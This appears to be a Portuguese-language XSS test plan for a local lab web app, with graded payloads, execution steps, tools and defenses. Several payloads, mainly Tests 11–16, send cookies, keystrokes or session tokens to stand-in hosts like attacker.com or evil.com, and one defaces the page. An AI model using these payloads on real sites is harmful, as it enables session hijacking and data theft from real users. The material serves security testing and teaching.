# Casos de Teste para XSS (Cross-Site Scripting)

## ⚠️ ATENÇÃO
Estes testes são para fins educacionais em ambiente controlado. **NUNCA** use em sistemas de produção ou sem autorização.

## 🎯 Objetivos dos Testes
- Identificar vulnerabilidades XSS
- Entender diferentes tipos de ataques XSS
- Aprender técnicas de bypass de filtros
- Demonstrar impactos de segurança

## 📝 Tipos de XSS

### 1. XSS Refletido (Reflected XSS)
Executa scripts através de parâmetros da URL ou formulários.

### 2. XSS Armazenado (Stored XSS)  
Scripts maliciosos ficam persistentes no banco de dados.

### 3. XSS Baseado no DOM (DOM XSS)
Exploração através de manipulação do DOM no lado cliente.

---

## 🧪 Casos de Teste Básicos

### Teste 1: Alert Simples
**Descrição:** Teste básico de execução de JavaScript
**Payload:** `<script>alert('XSS')</script>`
**Local:** Campos de comentário, nome, busca
**Resultado Esperado:** Pop-up de alerta

### Teste 2: Bypass de Filtros com Maiúsculas
**Descrição:** Contornar filtros que só removem tags em minúsculas
**Payload:** `<SCRIPT>alert('XSS')</SCRIPT>`
**Local:** Formulários de cadastro
**Resultado Esperado:** Execução mesmo com filtro básico

### Teste 3: Mixed Case
**Descrição:** Combinação de maiúsculas e minúsculas
**Payload:** `<ScRiPt>alert('XSS')</ScRiPt>`
**Local:** Campos de entrada de texto
**Resultado Esperado:** Bypass de filtros simples

---

## 🔥 Casos de Teste Intermediários

### Teste 4: XSS via Atributo de Imagem
**Descrição:** Exploração através de tag img com onerror
**Payload:** `<img src=x onerror=alert('XSS')>`
**Local:** Campos que permitem HTML
**Resultado Esperado:** Execução quando imagem falha ao carregar

### Teste 5: XSS via SVG
**Descrição:** Usando SVG para executar scripts
**Payload:** `<svg onload=alert('XSS')>`
**Local:** Campos de comentário
**Resultado Esperado:** Execução imediata

### Teste 6: XSS via Iframe
**Descrição:** Exploração através de iframe
**Payload:** `<iframe src=javascript:alert('XSS')></iframe>`
**Local:** Campos que aceitam HTML
**Resultado Esperado:** Pop-up de alerta

### Teste 7: XSS com Codificação
**Descrição:** Usando codificação HTML para bypass
**Payload:** `&#60;script&#62;alert('XSS')&#60;/script&#62;`
**Local:** Campos de entrada
**Resultado Esperado:** Execução após decodificação

---

## 🚀 Casos de Teste Avançados

### Teste 8: XSS Poligloto
**Descrição:** Payload que funciona em múltiplos contextos
**Payload:** `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
**Local:** Qualquer campo de entrada
**Resultado Esperado:** Execução em vários contextos

### Teste 9: XSS via Data URI
**Descrição:** Usando data URI para executar scripts
**Payload:** `<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>`
**Local:** Campos que aceitam URLs
**Resultado Esperado:** Execução de script

### Teste 10: XSS com Filter Evasion
**Descrição:** Bypass usando quebras de linha e tabs
**Payload:** `<script
>alert('XSS')</script>`
**Local:** Campos de texto multi-linha
**Resultado Esperado:** Bypass de filtros que não consideram quebras

### Teste 11: XSS via CSS
**Descrição:** Execução através de propriedades CSS
**Payload:** `<style>@import'http://evil.com/xss.css';</style>`
**Local:** Campos que permitem CSS
**Resultado Esperado:** Carregamento de CSS malicioso

### Teste 12: XSS Blind
**Descrição:** XSS que faz requisições para servidor externo
**Payload:** `<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>`
**Local:** Campos que não mostram output
**Resultado Esperado:** Envio de cookies para servidor atacante

---

## 💀 Casos de Teste Extremos

### Teste 13: XSS com Roubo de Cookies
**Descrição:** Script que captura e envia cookies
**Payload:** `<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>`
**Local:** Qualquer campo XSS
**Resultado Esperado:** Redirecionamento com cookies na URL

### Teste 14: XSS com Keylogger
**Descrição:** Script que captura teclas digitadas
**Payload:** 
```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keylog.php?key=' + String.fromCharCode(e.which));
}
</script>
```
**Local:** Campos persistentes
**Resultado Esperado:** Captura de todas as teclas

### Teste 15: XSS com Defacement
**Descrição:** Script que modifica a página inteira
**Payload:** 
```javascript
<script>
document.body.innerHTML = '<h1 style="color:red">HACKED!</h1>';
</script>
```
**Local:** Comentários ou perfil
**Resultado Esperado:** Alteração visual da página

### Teste 16: XSS com Session Hijacking
**Descrição:** Roubo de token de sessão
**Payload:** 
```javascript
<script>
var token = localStorage.getItem('authToken');
fetch('http://attacker.com/session.php?token=' + token);
</script>
```
**Local:** Dashboard ou área logada
**Resultado Esperado:** Envio do token de sessão

---

## 🛠️ Como Executar os Testes

### Passo 1: Preparar Ambiente
1. Certifique-se de que está em ambiente de teste
2. Configure um servidor para capturar requisições (optional)
3. Use ferramentas como Burp Suite ou OWASP ZAP

### Passo 2: Executar Testes Básicos
1. Acesse `http://localhost:3000/register.html`
2. Digite os payloads nos campos de nome e comentário
3. Observe se alertas são executados

### Passo 3: Executar Testes Avançados
1. Acesse `http://localhost:3000/dashboard.html`
2. Use a seção de comentários para testes persistentes
3. Teste em diferentes navegadores

### Passo 4: Documentar Resultados
1. Anote quais payloads funcionaram
2. Documente onde cada vulnerabilidade foi encontrada
3. Teste possíveis correções

---

## 🔧 Ferramentas Recomendadas

- **XSStrike:** Scanner automático de XSS
- **Burp Suite:** Proxy para interceptar e modificar requisições
- **OWASP ZAP:** Scanner gratuito de vulnerabilidades
- **Browser DevTools:** Para análise manual do DOM

---

## 📊 Checklist de Testes

- [ ] XSS em formulários de login
- [ ] XSS em formulários de cadastro
- [ ] XSS em campos de comentários
- [ ] XSS em campos de busca
- [ ] XSS em parâmetros da URL
- [ ] XSS em headers HTTP
- [ ] XSS em cookies
- [ ] XSS via upload de arquivos
- [ ] XSS em diferentes navegadores
- [ ] XSS com diferentes codificações

---

## 🛡️ Medidas de Proteção a Testar

Após identificar as vulnerabilidades, teste estas proteções:

1. **Sanitização de entrada:** Remoção/escape de caracteres perigosos
2. **Validação de entrada:** Whitelist de caracteres permitidos
3. **Content Security Policy (CSP):** Headers que bloqueiam scripts inline
4. **HTML Entity Encoding:** Conversão de caracteres especiais
5. **HttpOnly Cookies:** Cookies inacessíveis via JavaScript

---

## ⚠️ AVISOS IMPORTANTES

1. **Use apenas em ambiente de teste**
2. **Nunca teste em sistemas sem autorização**
3. **Documente todas as vulnerabilidades encontradas**
4. **Implemente correções após os testes**
5. **Mantenha backups antes de testar**

---

## 📚 Recursos Adicionais

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Payloads Database](http://www.xss-payloads.com/)
- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/)